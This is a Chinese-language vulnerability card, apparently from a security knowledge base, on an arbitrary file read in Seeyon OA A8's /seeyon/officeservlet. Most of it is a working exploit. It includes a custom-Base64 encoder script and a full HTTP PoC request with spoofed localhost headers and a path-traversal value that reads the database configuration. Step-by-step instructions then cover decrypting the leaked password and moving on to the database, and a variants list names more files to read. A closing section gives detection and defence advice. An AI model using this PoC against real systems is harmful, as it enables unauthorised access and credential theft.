---
id: web-java-component-seeyon-officeservlet-imsgserver2000-file-read
title: 致远OA A8 officeservlet 任意文件读取：iMsgServer2000 64 字节包头 + 变种 Base64，LOADTEMPLATE 触发 MsgFileLoad
type: scenario
domain: web
path: web/java/component
technique: seeyon-officeservlet-imsgserver2000-file-read
tags:
- java
- seeyon
- 致远oa
- path-traversal
- file-read
- imsgserver2000
- base64-variant
- struts
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V532
  verified_at: '2026-11-11T17:22:01+08:00'
  notes: 已对照原文13182与16/16截图核对：img03 web.xml确认officeservlet→com.seeyon.ctp.common.office.OfficeServlet；img04-08确认doGet→readVariant→ReadPackage→StreamToMsg与64字节头解析，img16确认MsgToStream把FMsgFile写入FStream回显；img09-11确认OPTION=LOADTEMPLATE→taoHong，COMMAND=INSERTFILE时TEMPLATE作为officePath进MsgFileLoad；img01 Burp请求/响应读到ctpDataSource.password=/1.0/VWZ0dTIzNC8=与同页'DBSTEP V3.0 285 0 369'响应头；img02 PassDecode得Test123.，与卡PoC响应节选一致。按原文JS变种Base64实测解码：OPTION=LKDxOWOWLlxwVlOW→LOADTEMPLATE，TEMPLATE=qf85...→./../../base/conf/datasourceCtp.properties，COMMAND=BSTLOlMSOCQwOV66→INSERTFILE，PoC值全部成立。修正：一句话结论与原理中补上MsgFileLoad还需COMMAND=INSERTFILE这一条件（原表述过于简化）。版本：原文仅写漏洞环境A8 V7.0（标题A8-V5），无明确受影响版本区间，未设置affected_versions，符合不猜测原则。dedup候选为xrdController/autoinstall/AIEdoc/通用OA文件读取等不同入口与协议，非同链。
url: /docs/web/java/component/web-java-component-seeyon-officeservlet-imsgserver2000-file-read/
draft: false
kb_aliases:
- 致远OA 任意文件读取
- officeservlet 文件读取
- iMsgServer2000
- DBSTEP V3.0
- LOADTEMPLATE taoHong
- MsgFileLoad
- 致远变种 Base64
---

## 一句话结论

致远OA A8 的 `/seeyon/officeservlet` 接收 `iMsgServer2000` 自定义包：前 64 字节依次是版本号（0–15）、`FMsgText` 长度（16–31）、`FError` 长度（32–47）、`FMsgFile` 长度（48–63），随后是 `FMsgText`（`KEY=变种Base64(值)` 的文本行）；当 `OPTION` 解码为 `LOADTEMPLATE` 进入 `HandWriteManager.taoHong`、且 `COMMAND` 解码为 `INSERTFILE` 时，`TEMPLATE` 的值被当作 `officePath` 传给 `msgObj.MsgFileLoad(officePath)`，后者 `new File(path)` + `FileInputStream` 读取任意文件到 `FMsgFile`，最后 `sendPackage → MsgVariant → MsgToStream` 把 `FMsgFile` 写进响应，形成任意文件读取（实测读 `./../../base/conf/datasourceCtp.properties` 获取数据库配置）。

## 原理

- **Servlet 与自定义协议**：`web.xml` 将 `officeservlet` 映射到 `com.seeyon.ctp.common.office.OfficeServlet`；`doGet/doPost` 都走 `doGet`，首行 `handWriteManager.readVariant(request, msgObj)`。
- **包体解析**：`readVariant` 调用 `msgObj.ReadPackage(request)`，把整个请求体读入 `FStream` 后调用 `StreamToMsg()`：取前 64 字节文本，`substring(0,15)` 为版本（`DBSTEP V3.0`），`substring(16,31)`/`(32,47)`/`(48,63)` 分别为 `FMsgText`/`FError`/`FMsgFile` 长度；按长度依次切出 `FMsgText`、`FError`、`FMsgFile`，并可用末尾 32 字节 MD5 校验（不校验也可走通）。
- **变种 Base64**：`GetMsgByName(key)` 在 `FMsgText` 中找 `key=` 到 `\r\n` 之间的值，再 `DecodeBase64`；该 Base64 使用自定义字母表（`gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6` ↔ 标准表），所以构造请求时要先把 `OPTION`/`TEMPLATE` 等值用同一算法编码。
- **分派到文件读取**：`String option = msgObj.GetMsgByName("OPTION")`；`LOADTEMPLATE` 分支调用 `handWriteManager.taoHong(msgObj)`。`taoHong` 取 `String officePath = msgObj.GetMsgByName("TEMPLATE")`，当 `COMMAND` 为 `INSERTFILE` 时调用 `msgObj.MsgFileLoad(officePath)`（原文 PoC 的 COMMAND 解码即 INSERTFILE）。
- **sink**：`MsgFileLoad(String path)` 直接 `new File(path)`，`new FileInputStream(file)` 循环读入 `FMsgFile`，没有任何基目录/规范化校验；`TEMPLATE` 值可含 `../`，从而读取应用目录外的配置。
- **回显**：`sendPackage(response, msgObj)` → `msgObj.SendPackage(response)` → `MsgVariant()` → `MsgToStream()`：用 `FMsgText`、`FError`、`FFileSize` 构造 `ByteArrayOutputStream`，把 `FMsgFile` 原样写入，赋给 `FStream` 并作为响应体返回；因此文件内容直接回显。
- **后续利用**：读到 `datasourceCtp.properties` 中的 `ctpDataSource.password=/1.0/...` 后，用致远专用解密脚本（如 PassDecode）还原明文数据库口令，进一步连库/横向。

## 触发条件

- 目标为致远OA A8（原文测试环境 A8 V7.0），`/seeyon/officeservlet` 可达。
- 请求体符合 `iMsgServer2000` 格式：64 字节头 + 指定长度的 `FMsgText`；`OPTION`/`TEMPLATE` 等值用变种 Base64 编码。
- 目标文件对应用进程可读；原文请求还携带 `JSESSIONID` 与 `X-Forwarded-For`/`X-Originating-IP`/`X-Remote-IP`/`X-Remote-Addr: 127.0.0.1` 等头（可能用于绕过来源限制，按目标环境保留）。
- `COMMAND`/`OPTION` 解码值命中 `LOADTEMPLATE`/`INSERTFILE` 分支（原文 PoC 中 `OPTION=LKDxOWOWLlxwVlOW` 解码为 LOADTEMPLATE）。

## 利用步骤

1. 用变种 Base64 算法编码目标路径（如 `./../../base/conf/datasourceCtp.properties`），得到 `TEMPLATE=...`；编码 `LOADTEMPLATE` 得到 `OPTION=...`。
2. 构造 `FMsgText`：每行 `KEY=编码值`，包含 `OPTION`、`TEMPLATE`、`COMMAND`、`RECORDID` 等；统计其字节长度填入 64 字节头的 16–31 位，`FError`/`FMsgFile` 长度填 0。
3. 按 `DBSTEP V3.0` + 三个长度字段拼出 64 字节头（原文示例：版本行后接 `285`、`0`、`0`，空格填充到固定列），再接 `FMsgText`。
4. POST 到 `/seeyon/officeservlet`，读取响应体中的文件内容。
5. 对 `datasourceCtp.properties` 里的加密口令用 PassDecode 等工具解密，得到数据库明文口令；按需继续读取其他配置文件。

## PoC

变种 Base64 映射（原文 JS：`a2b` 解密、`b2a` 加密；`c` 为待转换值）：

```javascript
var a = "gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6";
var b = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
var c = "LOADTEMPLATE";
var d = "";
function a2b(v) { for (var i=0;i<a.length;i++) if (a[i]==v) return b[i]; }
function b2a(v) { for (var i=0;i<b.length;i++) if (b[i]==v) return a[i]; }
for (var i=0;i<c.length;i++) d += b2a(c[i]);   // 编码；解密用 a2b
```

请求（原文，`Content-Length: 350`；`TEMPLATE` 为 `./../../base/conf/datasourceCtp.properties` 的编码值）：

```http
POST /seeyon/officeservlet HTTP/1.1
Host: target
Cookie: JSESSIONID=<任意会话>; loginPageURL=
x-forwarded-for: 127.0.0.1
x-originating-ip: 127.0.0.1
x-remote-ip: 127.0.0.1
x-remote-addr: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 350

DBSTEP V3.0     285             0               0              
RECORDID=wLoi
CREATEDATE=wLehP4whzUoiw=66
originalFileId=wLoi
needReadFile=yRWZdAS6
originalCreateDate=wLehP4whzUoiw=66
OPTION=LKDxOWOWLlxwVlOW
TEMPLATE=qf85qf85qfDfeazQqAzvcRevy1W3eazvNaMUySz3d7TsdRDsyaM3nYli
COMMAND=BSTLOlMSOCQwOV66
affairMemberId=wLoi
affairMemberName=wLoi
```

响应节选（原文）：`ctpDataSource.url=jdbc:mysql://127.0.0.1:3306/seeyon...`、`ctpDataSource.username=root`、`ctpDataSource.password=/1.0/VWZ0dTIzNC8=`；用 `java -jar PassDecode.jar seeyon /1.0/VWZ0dTIzNC8=` 得到明文 `Test123.`。

## 变体与关联

- **OPTION 变体**：`LOADFILE`/`INSERTFILE` 等其他分支也调用 `LoadFile`/`MsgFileLoad`，可尝试不同 `OPTION`/`COMMAND` 组合；核心是找到把 `TEMPLATE`/`fileUrl` 传给 `MsgFileLoad` 的分支。
- **读取目标**：`datasourceCtp.properties`、`web.xml`、`base/conf` 下密钥/连接配置、日志、系统文件等；`../` 层数按部署路径调整。
- **同产品其他卡**：[[web-java-component-seeyon-autoinstall-login-locale-zip-traversal]]、[[web-java-component-seeyon-thirdpartycontroller-enc-arbitrary-user-login]]、[[web-java-component-seeyon-xrdcontroller-checkissign-file-copy-traversal]]、[[web-generic-file-inclusion-seeyon-aiedoc-correct-downloaderrorreport]]。
- **协议特征**：`DBSTEP V3.0` 与 64 字节定长头是该 Servlet 的强特征，可作为检测/指纹依据。

## 检测与防御

- **检测（Web 日志）**：`POST /seeyon/officeservlet` 请求体以 `DBSTEP V3.0` 开头、64 字节头中三个长度字段异常；`TEMPLATE` 解码后含 `../`/绝对路径/`.properties`；请求携带 `X-Forwarded-For`/`X-Originating-IP` 等伪造 127.0.0.1 的头；响应体异常包含配置文本。
- **检测（主机/应用）**：应用进程读取 `base/conf/datasourceCtp.properties` 等敏感配置；Servlet 日志出现 `MsgFileLoad` 读取应用目录外路径。
- **防御**：升级到厂商修复版本；`MsgFileLoad`/`taoHong` 对路径做规范化并校验必须位于模板/办公文档基目录；限制 `officeservlet` 来源（不要信任 X-Forwarded-For 等客户端头）；配置数据库口令加密存储并限制配置文件权限；WAF 拦截 `DBSTEP V3.0` 异常包。
